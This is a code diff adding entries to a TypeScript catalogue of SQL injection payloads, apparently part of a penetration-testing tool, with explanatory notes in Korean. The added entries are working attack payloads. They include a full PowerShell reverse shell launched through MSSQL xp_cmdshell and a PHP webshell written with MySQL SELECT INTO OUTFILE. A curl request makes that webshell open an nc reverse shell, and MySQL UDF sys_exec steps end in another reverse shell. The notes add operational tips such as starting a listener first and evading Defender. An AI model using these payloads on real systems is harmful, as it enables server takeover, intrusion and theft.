@@ -121,6 +121,73 @@ export const sqlPayloadCategories: SqlPayloadCategory[] = [
       { label: "UNION으로 결과 유출",
         payload: "'; EXEC xp_cmdshell 'whoami'-- -",
         note: "결과가 응답에 안 보이면 stacked query 지원 여부와 out-of-band 방법을 검토." },
+      { label: "리버스 쉘 (PowerShell, 이미 실행 인터페이스가 있는 경우)",
+        payload: "EXEC xp_cmdshell 'powershell -nop -w hidden -c \"$c=New-Object " +
+          "Net.Sockets.TCPClient(\\\"{LHOST}\\\",{LPORT});$s=$c.GetStream();" +
+          "[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){" +
+          "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);" +
+          "$r2=$r+\\\"PS \\\"+(pwd).Path+\\\"> \\\";$sb=([Text.Encoding]::ASCII).GetBytes($r2);" +
+          "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"';",
+        note: "PowerShell 문자열을 전부 이스케이프한 큰따옴표(\\\")로만 써서 SQL 단일 인용부호와 " +
+          "충돌을 피했습니다 -- 활성화(xp_cmdshell 활성화 항목)가 선행돼야 하고, 같은 포트로 " +
+          "Enumeration 탭의 리버스 쉘 패널에서 리스너를 먼저 켜두세요. Defender가 켜져 있으면 " +
+          "탐지될 수 있습니다." },
+      { label: "리버스 쉘 (인젝션 컨텍스트, stacked query)",
+        payload: "'; EXEC xp_cmdshell 'powershell -nop -w hidden -c \"$c=New-Object " +
+          "Net.Sockets.TCPClient(\\\"{LHOST}\\\",{LPORT});$s=$c.GetStream();" +
+          "[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){" +
+          "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);" +
+          "$r2=$r+\\\"PS \\\"+(pwd).Path+\\\"> \\\";$sb=([Text.Encoding]::ASCII).GetBytes($r2);" +
+          "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"'-- -",
+        note: "위 항목과 같은 페이로드를 stacked query 인젝션 컨텍스트에 맞춰 앞뒤만 감쌌습니다." },
+    ],
+  },
+  {
+    id: "mysql-outfile-webshell",
+    title: "MySQL SELECT INTO OUTFILE 웹셸",
+    engines: ["mysql"],
+    description: "FILE 권한과 secure_file_priv가 빈 값인 계정에서만 동작하고, 웹서버가 그 경로를 " +
+      "서비스해야 트리거할 수 있습니다. UDF(sys_exec)보다 조건은 간단하지만 웹 루트 경로를 " +
+      "미리 알아야 합니다(기본값은 /var/www/html이지만 다를 수 있으니 먼저 확인하세요).",
+    payloads: [
+      { label: "secure_file_priv 확인", payload: "SHOW VARIABLES LIKE 'secure_file_priv';",
+        note: "빈 문자열이면 파일 쓰기 경로 제한이 없다는 뜻입니다. NULL이면 이 기법 자체가 " +
+          "비활성화된 것입니다." },
+      { label: "PHP 웹셸 파일 쓰기 (이미 쿼리 인터페이스가 있는 경우)",
+        payload: "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'" },
+      { label: "인젝션 컨텍스트 (UNION)",
+        payload: "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',NULL,NULL INTO OUTFILE " +
+          "'/var/www/html/shell.php'-- -" },
+      { label: "웹셸로 리버스 쉘 트리거 (curl)",
+        payload: "curl 'http://TARGET/shell.php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|" +
+          "/bin/sh+-i+2>%261|nc+{LHOST}+{LPORT}+>/tmp/f'",
+        note: "TARGET을 대상 IP로 직접 바꾸세요(자동 채움 대상 아님). 같은 포트로 Enumeration " +
+          "탭의 리버스 쉘 패널에서 리스너를 먼저 켜두고, 웹셸이 실제로 그 경로에 만들어졌는지 " +
+          "먼저 확인한 뒤 실행하세요." },
+    ],
+  },
+  {
+    id: "mysql-udf-rce",
+    title: "MySQL UDF (sys_exec)",
+    engines: ["mysql"],
+    description: "FILE 권한과 plugin 디렉터리 쓰기 권한이 있을 때, 대상 아키텍처에 맞게 미리 컴파일된 " +
+      "lib_mysqludf_sys.so(metasploit-framework 패키지나 sqlmap의 udf 리소스에 포함)를 plugin " +
+      "디렉터리에 심어 SQL에서 직접 명령을 실행하는 함수를 등록합니다. .so 자체를 SQL만으로 " +
+      "만들 수는 없으므로 대상에 먼저 업로드해두는 별도 단계가 필요한 멀티스텝 기법입니다.",
+    payloads: [
+      { label: "plugin 디렉터리 확인", payload: "SHOW VARIABLES LIKE 'plugin_dir';" },
+      { label: "업로드해둔 .so를 plugin 디렉터리로 복사",
+        payload: "SELECT LOAD_FILE('/tmp/lib_mysqludf_sys.so') INTO DUMPFILE " +
+          "'/usr/lib/mysql/plugin/lib_mysqludf_sys.so'",
+        note: "/tmp/lib_mysqludf_sys.so는 이미 대상에 올려둔 컴파일된 라이브러리 경로로, " +
+          "목적지는 위에서 확인한 실제 plugin_dir 값으로 바꾸세요." },
+      { label: "sys_exec 함수 등록",
+        payload: "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so'" },
+      { label: "명령 실행", payload: "SELECT sys_exec('whoami');" },
+      { label: "리버스 쉘 실행",
+        payload: "SELECT sys_exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|" +
+          "nc {LHOST} {LPORT} >/tmp/f');",
+        note: "같은 포트로 Enumeration 탭의 리버스 쉘 패널에서 리스너를 먼저 켜두세요." },
     ],
   },
   {
